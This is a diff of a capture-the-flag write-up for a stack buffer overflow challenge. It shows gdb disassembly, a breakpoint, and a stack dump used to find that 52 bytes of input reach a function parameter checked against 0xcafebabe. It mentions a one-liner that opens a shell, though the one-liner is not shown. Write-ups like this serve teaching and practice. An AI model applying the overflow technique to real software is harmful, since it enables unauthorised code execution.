@@ -26,7 +26,7 @@ Dump of assembler code for function func:
 0x5655564f <+35>:    call   0x56555650 <func+36>
 0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
 ```
-Put a breakpoint there and run the application
+Put a breakpoint there, run the application and provide 8 bytes junk data to stdin to see where the data will be located in the stack.
 ```
 (gdb) b *func +40
 Breakpoint 1 at 0x56555654
@@ -46,7 +46,7 @@ Dump the stack frame. ```ebp-0x48``` because, func allocated 0x48 bytes in stack
 0xffffcf80:     0x00000000      0xf7e185db      0xffffcfa8      0x5655569f
 0xffffcf90:     0xdeadbeef      0x00000000      0x565556b9      0x00000000
 ```
-As seen above, we need 52 bytes till parameter to func.
+As seen above, we can see the input data as 0x42424141 0x44444343.Hence we need 52 bytes till parameter to func.
 
 Along with the script, challange can be solved with the following one-liner as well. After shell is opened, ```cat flag``` to get the flag
 ```
